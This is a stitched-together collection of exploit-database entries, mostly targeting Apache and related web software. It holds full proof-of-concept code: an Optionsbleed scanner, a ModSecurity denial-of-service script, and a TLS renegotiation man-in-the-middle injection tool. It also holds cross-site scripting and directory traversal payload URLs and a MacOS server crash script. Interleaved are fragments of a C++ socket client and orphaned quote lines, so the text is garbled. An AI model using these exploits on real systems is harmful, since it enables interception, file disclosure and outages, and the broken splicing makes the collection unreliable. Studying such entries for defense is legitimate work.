\'#!/usr/bin/env python3\\r\
\\r\
# Optionsbleed proof of concept test\\r\
# by Hanno B\\xc3\\xb6ck\\r\
\\r\
import argparse\\r\
import urllib3\\r\
import re\\r\
\\r\
\\r\
def test_bleed(url, args):\\r\
    r = pool.request(\\\'OPTIONS\\\', url)\\r\
    try:\\r\
        allow = str(r.headers["Allow"])\\r\
    except KeyError:\\r\
        return False\\r\
    if allow in dup:\\r\
        return\\r\
    dup.append(allow)\\r\
    if allow == "":\\r\
        print("[empty] %s" % (url))\\r\
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$", allow):\\r\
        z = [x.strip() for x in allow.split(\\\',\\\')]\\r\
        if len(z) > len(set(z)):\\r\
            print("[duplicates] %s: %s" % (url, repr(allow)))\\r\
        elif args.all:\\r\
            print("[ok] %s: %s" % (url, repr(allow)))\\r\
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$", allow):\\r\
        print("[spaces] %s: %s" % (url, repr(allow)))\\r\
    else:\\r\
        print("[bleed] %s: %s" % (url, repr(allow)))\\r\
    return True\\r\
\\r\
\\r\
parser = argparse.ArgumentParser(\\r\
         description=\\\'Check for the Optionsbleed vulnerability (CVE-2017-9798).\\\',\\r\
         epilog="Tests server for Optionsbleed bug and other bugs in the allow header.\\\
\\\
"\\r\
         "Autmatically checks http://, https://, http://www. and https://www. -\\\
"\\r\
         "except if you pass -u/--url (which means by default we check 40 times.)\\\
\\\
"\\r\
         "Explanation of results:\\\
"\\r\
         "[bleed] corrupted header found, vulnerable\\\
"\\r\
         "[empty] empty allow header, does not make sense\\\
"\\r\
         "[spaces] space-separated method list (should be comma-separated)\\\
"\\r\
         "[duplicates] duplicates in list (may be apache bug 61207)\\\
"\\r\
         "[ok] normal list found (only shown with -a/--all)\\\
",\\r\
         formatter_class=argparse.RawTextHelpFormatter)\\r\
parser.add_argument(\\\'hosttocheck\\\',  action=\\\'store\\\',\\r\
                    help=\\\'The hostname you want to test against\\\')\\r\
parser.add_argument(\\\'-n\\\', nargs=1, type=int, default=[10],\\r\
                    help=\\\'number of tests (default 10)\\\')\\r\
parser.add_argument("-a", "--all", action="store_true",\\r\
                    help="show headers from hosts without problems")\\r\
parser.add_argument("-u", "--url", action=\\\'store_true\\\',\\r\
                    help="pass URL instead of hostname")\\r\
args = parser.parse_args()\\r\
howoften = int(args.n[0])\\r\
\\r\
dup = []\\r\
\\r\
# Note: This disables warnings about the lack of certificate verification.\\r\
# Usually this is a bad idea, but for this tool we want to find vulnerabilities\\r\
# even if they are shipped with invalid certificates.\\r\
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\\r\
\\r\
pool = urllib3.PoolManager(10, cert_reqs=\\\'CERT_NONE\\\')\\r\
\\r\
if args.url:\\r\
    test_bleed(args.hosttocheck, args)\\r\
else:\\r\
    for prefix in [\\\'http://\\\', \\\'http://www.\\\', \\\'https://\\\', \\\'https://www.\\\']:\\r\
        for i in range(howoften):\\r\
            try:\\r\
                if test_bleed(prefix+args.hosttocheck, args) is False:\\r\
                    break\\r\
            except Exception as e:\\r\
                pass\

\'Source: http://packetstormsecurity.com/files/121815/modsecurity_cve_2013_2765_check.py.txt\\r\
When ModSecurity receives a request body with a size bigger than the value set by the "SecRequestBodyInMemoryLimit" and with a "Content-Type" that has no request body processor mapped to it, ModSecurity will systematically crash on every call to "forceRequestBodyVariable" (in phase 1). This is the proof of concept exploit. Versions prior to 2.7.4 are affected.\\r\
\\r\
#!/usr/bin/env python3\\r\
#-*- coding: utf-8 -*-\\r\
#\\r\
# Created on Mar 29, 2013\\r\
#\\r\
# @author: Younes JAAIDI <yjaaidi@shookalabs.com>\\r\
#\\r\
\\r\
import argparse\\r\
import http.client\\r\
import logging\\r\
import sys\\r\
import urllib.request\\r\
\\r\
logger = logging.getLogger(__name__)\\r\
logger.setLevel(logging.DEBUG)\\r\
logger.addHandler(logging.StreamHandler(sys.stderr))\\r\
\\r\
class ModSecurityDOSCheck(object):\\r\
\\r\
    _DEFAULT_REQUEST_BODY_SIZE = 200 # KB\\r\
    _DEFAULT_CONCURRENCY = 100\\r\
    _DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36"\\r\
\\r\
    def __init__(self):\\r\
        self._request_counter = 0\\r\
        self._status_message = None\\r\
\\r\
    def main(self, args_list):\\r\
        args_object = self._parse_args(args_list)\\r\
        \\r\
        payload = "A" * args_object.request_body_size * 1024\\r\
        \\r\
        request = urllib.request.Request(args_object.target_url,\\r\
                                         method = "GET",\\r\
                                         data = payload.encode(\\\'utf-8\\\'),\\r\
                                         headers = {\\\'Content-Type\\\': \\\'text/random\\\',\\r\
                                                    \\\'User-Agent\\\': self._DEFAULT_USER_AGENT})\\r\
        \\r\
        if self._send_request(request):\\r\
            logger.info("Target seems to be vulnerable!!!")\\r\
            return 0\\r\
        else:\\r\
            logger.info("Attack didn\\\'t work. Try increasing the \\\'REQUEST_BODY_SIZE\\\'.")\\r\
            return 1\\r\
\\r\
    def _parse_args(self, args_list):\\r\
        parser = argparse.ArgumentParser(description="ModSecurity DOS tool.")\\r\
        parser.add_argument(\\\'-t\\\', \\\'--target-url\\\',\\r\
                            dest = \\\'target_url\\\',\\r\
                            required = True,\\r\
                            help = "Target URL")\\r\
        parser.add_argument(\\\'-s\\\', \\\'--request-body-size\\\',\\r\
                            dest = \\\'request_body_size\\\',\\r\
                            default = self._DEFAULT_REQUEST_BODY_SIZE,\\r\
                            type = int,\\r\
                            help = "Request body size in KB")\\r\
        \\r\
        return parser.parse_args()\\r\
\\r\
    def _send_request(self, request):\\r\
        try:\\r\
            urllib.request.urlopen(request)\\r\
            return False\\r\
        except (http.client.BadStatusLine, urllib.error.HTTPError):\\r\
            return True\\r\
\\r\
if __name__ == \\\'__main__\\\':\\r\
    sys.exit(ModSecurityDOSCheck().main(sys.argv))\

");\\r\

");\\r\

");\\r\

");\\r\
}\\r\
\\r\
//Setup the server\\r\
int createConnection(string serverIP, int port)\\r\
{\\r\
\ int result = 0, len = 0;\\r\
\\r\
\ sockVersion = MAKEWORD(1,1);\\r\
\ WSAStartup(sockVersion, &wsaData);\\r\
\ \\r\
\ if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)\\r\
\ {\\r\
\ \ perror("error: socket()\\\
");\\r\
\ \ result = 1;\\r\
\ }\\r\
\\r\
\ rserver.sin_family = AF_INET;\\r\
\ rserver.sin_port = htons(port);\\r\
\ rserver.sin_addr.s_addr = inet_addr(serverIP.c_str());\\r\
\ memset(&rserver.sin_zero, 0, 8);\\r\
\\r\
\ len = sizeof(struct sockaddr_in);\\r\
\ \\r\
\ if ((connect(sock, (struct sockaddr *)&rserver, sizeof(struct sockaddr_in))) == -1)\\r\
\ {\\r\
\ \ perror("error: connect()\\\
");\\r\
\ \ result = 1;\\r\
\ }\\r\
\\r\
\ return result;\\r\
}\\r\
\\r\
//Send a message\\r\
int sendTransmission(string message)\\r\
{\\r\
\ int bytes_sent = 0;\\r\
\\r\
\ bytes_sent = send(sock, message.c_str(), message.length(), 0);\\r\
\ if (bytes_sent < 0)\\r\
\ {\\r\
\ \ perror("error: send()\\\
");\\r\
\ \ exit(1);\\r\
\ }\\r\
\ \\r\
\ return bytes_sent;\\r\
}\\r\
\\r\
//Receive a message\\r\
string recvTransmission()\\r\
{\\r\
\ string result;\\r\
\ char *c = new char[1];\\r\
\ int bytes_recv = 0;\\r\
\\r\
\ while (c[0] != NULL)\\r\
\ {\\r\
\ \ bytes_recv = recv(sock, c, 1, 0);\\r\
\\r\
\ \ if (bytes_recv < 0)\\r\
\ \ {\\r\
\ \ \ perror("error: recv()\\\
");\\r\
\ \ \ //exit(1);\\r\
\ \ }\\r\
\\r\
\ \ result += c[0];\\r\
\ }\\r\
\\r\
\ return result;\\r\
}\\r\
\\r\
//Clean up the connection\\r\
void cleanUp()\\r\
{\\r\
\ closesocket(sock);\\r\
\ WSACleanup();\\r\
}\

10071.exploit title: Mozilla NSS - NULL Character CA SSL Certificate Validation Security Bypass
10071.content:
"b'source: https://www.securityfocus.com/bid/35888/info\\r\
\\r\
Mozilla Network Security Services (NSS) is prone to a security-bypass vulnerability because it fails to properly validate the domain name in a signed CA certificate, allowing attackers to substitute malicious SSL certificates for trusted ones.\\r\
\\r\
The NSS library is used by a number of applications, including Mozilla Firefox, Thunderbird, and SeaMonkey.\\r\
\\r\
Successfully exploiting this issue allows attackers to perform man-in-the-middle attacks or impersonate trusted servers, which will aid in further attacks.\\r\
\\r\
NOTE (August 6, 2009): This BID had included a similar issue in Fetchmail, but that issue is now documented in BID 35951 (Fetchmail NULL Character CA SSL Certificate Validation Security Bypass Vulnerability).\\r\

10579.content:
\'#!/usr/bin/env python\\r\
\\r\
######################################\\r\
#                                    #\\r\
#  RedTeam Pentesting GmbH           #\\r\
#  kontakt@redteam-pentesting.de     #\\r\
#  http://www.redteam-pentesting.de  #\\r\
#                                    #\\r\
######################################\\r\
\\r\
# PoC exploit for the TLS renegotiation vulnerability (CVE-2009-3555)\\r\
\\r\
# License\\r\
# -------\\r\
# CC-BY-SA http://creativecommons.org/licenses/by-sa/3.0/\\r\
\\r\
# Timeline\\r\
# --------\\r\
# 2009-12-21 initial public release\\r\
\\r\
# Known Issues\\r\
# ------------\\r\
# Firefox: if it fails connecting to a TLS site too often, falls back to\\r\
#          issuing SSLv2 ClientHello only until browser is restarted\\r\
#\\r\
# wget:    attempts SSLv2 ClientHello by default\\r\
\\r\
# References\\r\
# ----------\\r\
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3555\\r\
# http://www.phonefactor.com/sslgap\\r\
# http://www.extendedsubset.com/\\r\
# http://www.g-sec.lu/practicaltls.pdf\\r\
# http://tools.ietf.org/html/draft-ietf-tls-renegotiation-01\\r\
\\r\
import tlslite\\r\
import tlslite.api\\r\
import tlslite.messages\\r\
import tlslite.constants\\r\
import struct\\r\
import socket\\r\
import threading\\r\
import array\\r\
import sys\\r\
import optparse\\r\
\\r\
\\r\
if not hasattr(threading.Thread, \\\'name\\\'):\\r\
    # emulate python 2.6 threading module for earlier versions\\r\
    threading.current_thread = threading.currentThread\\r\
    setattr(threading.Thread, \\\'name\\\',\\r\
            property(threading.Thread.getName, threading.Thread.setName))\\r\
\\r\
def forward(sock1, sock2):\\r\
    sock1.settimeout(1.0)\\r\
    while True:\\r\
        try:\\r\
            data = sock1.recv(4096)\\r\
            if not data:\\r\
                return\\r\
            sock2.send(data)\\r\
        except socket.error, ex_error:\\r\
            if ex_error[0] == 104: # Connection reset by peer\\r\
                return\\r\
        except socket.timeout, ex_timeout:\\r\
            pass\\r\
\\r\
\\r\
class MessageWrapper(object):\\r\
    def __init__(self, version = (3, 1), ssl2 = False):\\r\
        self.contentType = tlslite.messages.ContentType.handshake\\r\
        self.ssl2 = ssl2\\r\
        self.client_version = version\\r\
\\r\
    def setType(self, type):\\r\
        self.contentType = type\\r\
\\r\
    def addBytes(self, bytes):\\r\
        self.bytes = bytes\\r\
\\r\
    def write(self, trial=False):\\r\
        if trial:\\r\
            raise Exception(\\\'Unsupported\\\')\\r\
        return array.array(\\\'B\\\', self.bytes)\\r\
\\r\
def send_record(sock, msg_type, version_major, version_minor, record):\\r\
    msg = struct.pack(\\\'!BBBH\\\', msg_type, version_major, version_minor, len(record))\\r\
    if type(record) != str:\\r\
        msg += record.tostring()\\r\
    else:\\r\
        msg += record\\r\
    sock.send(msg)\\r\
\\r\
def send_encapsulated(sslsock, type, messagebytes, version = (3, 1)):\\r\
    msg = MessageWrapper(version)\\r\
    msg.addBytes(struct.unpack(\\\'B\\\'*len(messagebytes), messagebytes))\\r\
    msg.setType(type)\\r\
    for dummy in sslsock._sendMsg(msg, True):\\r\
        pass\\r\
\\r\
def decrypt_record(sslsock, type, recordbytes):\\r\
    for result in sslsock._decryptRecord(type, array.array(\\\'B\\\', recordbytes)):\\r\
        pass\\r\
    return result\\r\
\\r\
def recv_record(sock):\\r\
    try:\\r\
        header = sock.recv(5)\\r\
        if not header:\\r\
            return None, None, None, None\\r\
        msg_type, msg_version_major, msg_version_minor, msg_length = struct.unpack(\\\'!BBBH\\\', header)\\r\
        record = \\\'\\\'\\r\
        while len(record) != msg_length:\\r\
            record += sock.recv(msg_length - len(record))\\r\
        return msg_type, msg_version_major, msg_version_minor, record\\r\
    except socket.error, ex:\\r\
        if ex[0] == 104: # Connection reset by peer\\r\
            return\\r\
\\r\
def recv_clienthello(sock):\\r\
    header_bytes = []\\r\
    header_bytes.append(sock.recv(1))\\r\
    header_bytes[0] = struct.unpack(\\\'!B\\\', header_bytes[0])[0]\\r\
    if header_bytes[0] & 0x80:\\r\
        # Version 2.0 Client "Record Layer"\\r\
        header_bytes.append(sock.recv(1))\\r\
        header_bytes[1] = struct.unpack(\\\'!B\\\', header_bytes[1])[0]\\r\
        msg_length = (header_bytes[0] & 0x7f) << 8 | header_bytes[1]\\r\
        msg_version_major = 2\\r\
        msg_version_minor = 0\\r\
        msg_type = tlslite.constants.ContentType.handshake\\r\
        record = sock.recv(msg_length)\\r\
    else:\\r\
        header = sock.recv(4)\\r\
        msg_type = header_bytes[0]\\r\
        msg_version_major, msg_version_minor, msg_length = struct.unpack(\\\'!BBH\\\', header)\\r\
        record = sock.recv(msg_length)\\r\
\\r\
    return msg_type, msg_version_major, msg_version_minor, record\\r\
\\r\
def send_hello_request(sock):\\r\
    sock.send("\\\\x16"            # Record Layer: Handshake Message\\r\
             +"\\\\x03\\\\x01"        # Record Layer Version: TLS 1.0\\r\
             +"\\\\x00\\\\x04"        # Record Layer Length: 4\\r\
             +"\\\\x00"            # Handshake Message Type: Hello Request\\r\
             +"\\\\x00\\\\x00\\\\x00")   # Handshake Message Length: 0\\r\
\\r\
def send_protocol_version_alert(sock):\\r\
    sock.send("\\\\x15"            # Record Layer: Alert"\\r\
             +"\\\\x03\\\\x01"        # Record Layer Version: TLS 1.0\\r\
             +"\\\\x00\\\\x02"        # Record Layer Length: 2\\r\
             +"\\\\x00"            # Alert Message: fatal\\r\
             +"\\\\x46")           # Alert Message: protocol version\\r\
\\r\
\\r\
def handle_victim(victim, options, mitmcount):\\r\
\\r\
    if options.one_shot and mitmcount != 0:\\r\
        print threading.current_thread().name, \\\'--one-shot specified and initial connection already handled, forwarding only\\\'\\r\
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\r\
        try:\\r\
            sock.connect(options.target)\\r\
            print threading.current_thread().name, \\\'Connected to target %s:%u\\\' % options.target\\r\
        except socket.error, ex:\\r\
            print threading.current_thread().name, \\\'Couldn\\\\\\\'t connect to target %s:%u\\\' % options.target\\r\
            print threading.current_thread().name, \\\'Error code %u, \\\\\\\'%s\\\\\\\'\\\' % (ex[0], ex[1])\\r\
            sys.exit(1)\\r\
\\r\
        t1 = threading.Thread(target=forward, args=(sock, victim))\\r\
        t1.start()\\r\
\\r\
        t2 = threading.Thread(target=forward, args=(victim, sock))\\r\
        t2.start()\\r\
\\r\
        t1.join()\\r\
        sock.close()\\r\
\\r\
        t2.join()\\r\
        victim.close()\\r\
        return\\r\
\\r\
    # obtain initial "client hello" message\\r\
    msg_type, msg_version_major, msg_version_minor, hello_msg = recv_clienthello(victim)\\r\
    if msg_version_major == 2:\\r\
        print threading.current_thread().name, "client sent SSLv2 client hello message, exiting thread"\\r\
        return\\r\
\\r\
    tls_version = (msg_version_major, msg_version_minor)\\r\
    type, length, version_major, version_minor, random, session_id_length = struct.unpack(\\\'!B3sBB32sB\\\', hello_msg[:39])\\r\
    resume_session = (session_id_length != 0)\\r\
    if resume_session:\\r\
        print threading.current_thread().name, "client attempting to resume session"\\r\
\\r\
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\r\
    try:\\r\
        sock.connect(options.target)\\r\
        print threading.current_thread().name, \\\'Connected to target %s:%u\\\' % options.target\\r\
    except socket.error, ex:\\r\
        print threading.current_thread().name, \\\'Couldn\\\\\\\'t connect to target %s:%u\\\' % options.target\\r\
        print threading.current_thread().name, \\\'Error code %u, \\\\\\\'%s\\\\\\\'\\\' % (ex[0], ex[1])\\r\
        sys.exit(1)\\r\
\\r\
\\r\
    sslsock = tlslite.api.TLSConnection(sock)\\r\
    handshake_settings = tlslite.HandshakeSettings.HandshakeSettings()\\r\
    handshake_settings.minVersion = tls_version\\r\
    handshake_settings.maxVersion = tls_version\\r\
    sslsock.handshakeClientCert(settings = handshake_settings)\\r\
\\r\
    # inject prefix\\r\
    sslsock.write(options.inject)\\r\
    print threading.current_thread().name, \\\'Injected %s\\\' % repr(options.inject)\\r\
\\r\
    # send original "client hello" message over the encrypted channel\\r\
    send_encapsulated(sslsock, 22, hello_msg, tls_version)\\r\
\\r\
    # now receive serveral TLS messages from the server, decrypt them, and forward\\r\
    # them to the client, until the server sends "server hello done"\\r\
    # these messages include "server hello", "certificate", "server key exchange",\\r\
    # unless the client is trying to resume a previous session\\r\
    print threading.current_thread().name, "about to receive server handshake messages"\\r\
    server_handshake_done = False\\r\
    while not server_handshake_done:\\r\
        msg_type, msg_version_major, msg_version_minor, result = recv_record(sslsock.sock)\\r\
        if result:\\r\
            result = decrypt_record(sslsock, msg_type, result)\\r\
            send_record(victim, msg_type, msg_version_major, msg_version_minor, result)\\r\
            if result[0] == 0x0e: # server hello done - should terminate handshake\\r\
                server_handshake_done = True\\r\
            elif resume_session and msg_type == 0x14: # change cipher spec - probably irrelevant\\r\
                server_handshake_done = True\\r\
        else:\\r\
            print threading.current_thread().name, \\\'receive from server failed, exiting thread\\\'\\r\
            return\\r\
    print threading.current_thread().name, "server handshake done"\\r\
\\r\
\\r\
    # now its the the client\\\'s turn to send some messages, e.g.\\r\
    # "client key exchange" and "change cipher spec"\\r\
    print threading.current_thread().name, "about to receive client handshake messages"\\r\
    handshake_finished = False\\r\
    while not handshake_finished:\\r\
        msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)\\r\
        print threading.current_thread().name, msg_type\\r\
        send_encapsulated(sslsock, msg_type, record, tls_version)\\r\
        if msg_type == 0x14: # change cipher spec\\r\
            handshake_finished = True\\r\
\\r\
    print threading.current_thread().name, "client handshake done"\\r\
\\r\
    # message after "change cipher spec" must be sent in the "clear"\\r\
    msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)\\r\
    send_record(sslsock.sock, msg_type, msg_version_major, msg_version_minor, record)\\r\
\\r\
    # server should now send "change cipher spec" message, we decrypt and send that to the victim\\r\
    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)\\r\
    result = decrypt_record(sslsock, msg_type, record)\\r\
    send_record(victim, msg_type, msg_version_major, msg_version_minor, result)\\r\
\\r\
    # finalize handshake\\r\
    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)\\r\
    if record:\\r\
        send_record(victim, msg_type, msg_version_major, msg_version_minor, record)\\r\
    else:\\r\
        sslsock.sock.close()\\r\
        victim.close()\\r\
        del sslsock\\r\
        return\\r\
\\r\
\\r\
\\r\
    # the rest is just forwarding TLS records between both parties,\\r\
    # which we cannot interfere with anymore, apart from dropping server\\r\
    # responses\\r\
    if options.drop:\\r\
        sslsock.sock.close()\\r\
        del sslsock\\r\
    else:\\r\
        t1 = threading.Thread(target=forward, args=(sslsock.sock, victim))\\r\
        t1.start()\\r\
\\r\
    t2 = threading.Thread(target=forward, args=(victim, sslsock.sock))\\r\
    t2.start()\\r\
\\r\
    if not options.drop:\\r\
        t1.join()\\r\
        sslsock.sock.close()\\r\
\\r\
    t2.join()\\r\
    victim.close()\\r\
\\r\
\\r\
\\r\
if __name__ == "__main__":\\r\
    parser = optparse.OptionParser()\\r\
    parser.add_option(\\\'-l\\\', \\\'--listen\\\', dest=\\\'listen_port\\\', help=\\\'port to listen on\\\', metavar=\\\'PORT\\\', type=\\\'int\\\', default=8443)\\r\
    parser.add_option(\\\'-b\\\', \\\'--bind\\\', dest=\\\'bind_address\\\', help=\\\'address to bind to\\\', metavar=\\\'ADDRESS\\\', default=\\\'0.0.0.0\\\')\\r\
    parser.add_option(\\\'-t\\\', \\\'--target\\\', dest=\\\'target\\\', help=\\\'host and port to connect to\\\', metavar=\\\'HOST:PORT\\\' )\\r\
    parser.add_option(\\\'-i\\\', \\\'--inject\\\', dest=\\\'inject\\\', help=\\\'string to inject\\\', metavar=\\\'DATA\\\')\\r\
    parser.add_option(\\\'\\\', \\\'--inject-file\\\', dest=\\\'inject_file\\\', help=\\\'inject data from a file\\\', metavar=\\\'FILE\\\')\\r\
    parser.add_option(\\\'\\\', \\\'--inject-base64\\\', dest=\\\'inject_base64\\\', help=\\\'string to inject, base64-encoded\\\', metavar=\\\'DATA\\\')\\r\
    parser.add_option(\\\'-o\\\', \\\'--one-shot\\\', dest=\\\'one_shot\\\', action=\\\'store_true\\\', help=\\\'only mitm the first connection attempt, forward all other connections\\\')\\r\
    parser.add_option(\\\'-d\\\', \\\'--drop-responses\\\', dest=\\\'drop\\\', action="store_true", default=False, help=\\\'drop server responses after renegotiating\\\')\\r\
\\r\
    (options, args) = parser.parse_args()\\r\
\\r\
    if len([i for i in (options.inject, options.inject_file, options.inject_base64) if i]) != 1:\\r\
        print \\\'Exactly one injection option must be specified\\\'\\r\
        sys.exit(1)\\r\
\\r\
    if options.inject_file:\\r\
        try:\\r\
            options.inject = open(options.inject_file, \\\'r\\\').read()\\r\
        except IOError, ex:\\r\
            print ex\\r\
            sys.exit(1)\\r\
\\r\
    if options.inject_base64:\\r\
        import base64\\r\
        try:\\r\
            options.inject = base64.decodestring(options.inject_base64)\\r\
        except base64.binascii.Error, ex:\\r\
            print \\\'Error decoding base64 data: %s\\\' % ex\\r\
            sys.exit(1)\\r\
\\r\
\\r\
    if not options.listen_port or \\\\\\r\
       not options.bind_address or \\\\\\r\
       not options.target or \\\\\\r\
       not options.inject:\\r\
        parser.print_help()\\r\
        sys.exit(1)\\r\
\\r\
    target = options.target.split(\\\':\\\')\\r\
    if len(target)==2:\\r\
        try:\\r\
            target[1] = int(target[1])\\r\
        except ValueError:\\r\
            target[1] = None\\r\
    if len(target)!=2 or not target[0] or not target[1]:\\r\
        print \\\'Target \\\\\\\'%s\\\\\\\' not in format HOST:PORT\\\' % options.target\\r\
        sys.exit(1)\\r\
\\r\
    options.target = tuple(target)\\r\
\\r\
    try:\\r\
        listensocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\r\
        listensocket.bind((options.bind_address, options.listen_port))\\r\
        print \\\'Listening on %s:%u\\\' % (options.bind_address, options.listen_port)\\r\
    except socket.error, ex:\\r\
        print \\\'Couldn\\\\\\\'t listen on %s:%u\\\' % (options.bind_address, options.listen_port)\\r\
        print \\\'Error code %u, \\\\\\\'%s\\\\\\\'\\\' % (ex[0], ex[1])\\r\
        sys.exit(1)\\r\
\\r\
    listensocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\\r\
    listensocket.listen(5)\\r\
\\r\
    mitmcount = 0\\r\
\\r\
    while True:\\r\
        try:\\r\
            victim, victimaddr = listensocket.accept()\\r\
            print \\\'New connection from %s:%u\\\' % victimaddr\\r\
\\r\
            threading.Thread(target=handle_victim, args=(victim, options, mitmcount)).start()\\r\
            mitmcount += 1\\r\
\\r\
        except KeyboardInterrupt, ex:\\r\
            print \\\'\\\
Aborted by user, exiting...\\\'\\r\
            listensocket.close()\\r\
            sys.exit(1)\

"source: https://www.securityfocus.com/bid/34383/info\\r\
\\r\
The Apache \'mod_perl\' module is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.\\r\
\\r\
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. \\r\
\\r\
http://www.example.com/perl-status/APR::SockAddr::port/%22%3E%3Cscript%3Ealert(1)%3C/script%3E "

31759.exploit title: Microsoft Internet Explorer 2 - UTF-7 HTTP Response Handling
31759.content:
"source: https://www.securityfocus.com/bid/29112/info\\r\
\\r\
Microsoft Internet Explorer is prone to a weakness that can facilitate cross-site scripting attacks. The issue occurs because the application fails to sufficiently sanitize user-supplied input when handling UTF-7 charset data received in HTTP responses.\\r\
\\r\
Attackers can leverage this weakness to aid in cross-site scripting attacks against unsuspecting users of the application.\\r\
\\r\
Reports indicate that all versions of Internet Explorer are affected.\\r\
\\r\
Other browsers may also be affected under certain configurations, but this has not been confirmed.\\r\
\\r\
NOTE: This BID was originally titled \'Apache HTTP Server 403 Error Cross-Site Scripting Vulnerability\'.\\r\
\\r\
http://www.example.com/Znl5g3k70ZaBUPYmN5RAGUdkskoprzGI63K4mIj2sqzbX0Kc3Fu7vfthepWhmKvjudPuJTNeK9zw5MaZ1yXJi8RJRRuPe5UahFwOblMXsIPTGh3pVjTLdim3vuTKgdazOG9 idQbIjbnpMEco8Zlo5xNRuCoviPx7x7tYYeOgc8HU46gaecJwnHY7f6GlQB8H6kBFhjoIaHE1SQPhU5VReCz1olPh5jZ%3Cfont%20size=50%3EDEFACED%3C!xc+ADw-script+AD4-alert(\'xss\') +ADw-/script+AD4---//-- "

29739.content:
"b'source: https://www.securityfocus.com/bid/22960/info\\r\
\\r\
Apache HTTP servers running with the Tomcat servlet container are prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input data.\\r\
\\r\
Exploiting this issue allows attackers to access arbitrary files in the Tomcat webroot. This can expose sensitive information that could help the attacker launch further attacks.\\r\
\\r\
Versions in the 5.0 series prior to 5.5.22 and in the 6.0 series prior to 6.0.10 are vulnerable. \\r\
\\r\
http://www.example.com/foo/\\\\../manager/html'"

";\\r\

";\\r\

";\\r\

";\\r\

";\\r\

";    \\r\

";\\r\

}\\r\

";\\r\

";    \\r\

 do {\\r\

"); \\r\

19244.content:
"b'source: https://www.securityfocus.com/bid/306/info\\r\
\\r\
A vulnerability in the MacOS X Server may crash it while under heavy load.\\r\
\\r\
The vulnerability appears while stress testing a server running the Apache web server and 32 or more process are concurntly doing HTTP GET request to a CGI script in a loop. The system will panic and display a stack trace with ipc_task_init.\\r\
\\r\
Although the vulnerability is not related to web servering it can only be reproduced so far using this means.\\r\
\\r\
\\r\
#!/bin/bash\\r\
#\\r\
# CGI-McPanic: script to crash MacOS X with \\r\
#              concurrent calls to a CGI-Script\\r\
#\\r\
# before use, do:\\r\
# \\r\
# chmod a+x /Local/Library/WebServer/CGI-Executables/test-cgi\\r\
#\\r\
# then call\\r\
#\\r\
# bash ./CGI-McPanic\\r\
#\\r\
\\r\
NUMPROC=32\\r\
i=0\\r\
\\r\
while [ $i -le $NUMPROC ]\\r\
do\\r\
    i=$[$i + 1]\\r\
    ab -t 3600 http://localhost/cgi-bin/test-cgi &\\r\
done'"

19253.content:
"b'source: https://www.securityfocus.com/bid/318/info\\r\
\\r\
\\r\
The Debian GNU/Linux 2.1 apache package by default allows anyone to view /usr/doc via the web, remotely. This is because srm.conf is preconfigured with the line:\\r\
\\r\
Alias /doc/ /usr/doc/\\r\
\\r\
Boa is also preconfigured this way. \\r\
\\r\
\\r\
lynx http://some.host/doc\\r\
\\r\
This will provide you with all of the information in /usr/doc, which could be used to find vulnerable software on the remote machine.'"

20595.exploit title: NCSA 1.3/1.4.x/1.5 / Apache HTTPd 0.8.11/0.8.14 - ScriptAlias Source Retrieval
20595.content:
"b'source: https://www.securityfocus.com/bid/2300/info\\r\
\\r\
NSCA httpd prior to and including 1.5 and Apache Web Server prior to 1.0 contain a bug in the ScriptAlias function that allows remote users to view the source of CGI programs on the web server, if a ScriptAlias directory is defined under DocumentRoot. A full listing of the CGI-BIN directory can be obtained if indexing is turned on, as well. This is accomplished by adding multiple forward slashes in the URL (see exploit). The web server fails to recognize that a ScriptAlias directory is actually redirected to a CGI directory when this syntax is used, and returns the text of the script instead of properly executing it. This may allow an attacker to audit scripts for vulnerabilities, retrieve proprietary information, etc. \\r\
\\r\
To retrieve the contents of http://targethost/cgi-bin/script.cgi an attacker would use the following URL, provided the directory cgi-bin is redirected using ScriptAlias:\\r\
http://targethost///cgi-bin/script.cgi '"

20435.content:
\'source: https://www.securityfocus.com/bid/2003/info\\r\
\\r\
NCSA HTTPd and comes with a CGI sample shell script, test-cgi, located by default in /cgi-bin. This script does not properly enclose an "ECHO" command in quotes, and as a result "shell expansion" of the * character can occur under some configurations. This allows a remote attacker to obtain file listings, by passing *, /*, /usr/* etc., as variables. The ECHO command expands the * to give a directory listing of the specified directory. This could be used to gain information to facilitate future attacks. This is identical to a problem with another sample script, nph-test-cgi. See references. \\r\
\\r\
http://target/cgi-bin/test-cgi?/*\\r\
http://target/cgi-bin/test-cgi?* \

23751.content:
"source: https://www.securityfocus.com/bid/9733/info\\r\
\\r\
It has been reported that Apache may be prone to a directory traversal vulnerability that may allow a remote attacker to access information outside the server root directory. This issue is only reported to present itself in Apache running on cygwin platforms. A remote attacker may traverse outside the server root directory by using encoded \'\\\\..\' character sequences.\\r\
\\r\
http://www.example.com/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini\\r\
http://www.example.com/..%5C..%5C..%5C..%5C..%5C..%5C/boot.ini"

20558.content:
"source: https://www.securityfocus.com/bid/2216/info\\r\
\\r\
Apache Web Server 1.2 and previous versions are subject to a denial of service. By requesting a malformed GET request composed of an unusually large number of \'/\' characters, an attacker can cause CPU usage to spike. A restart of the service is required to gain normal functionality. \\r\
\\r\
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/20558.zip"

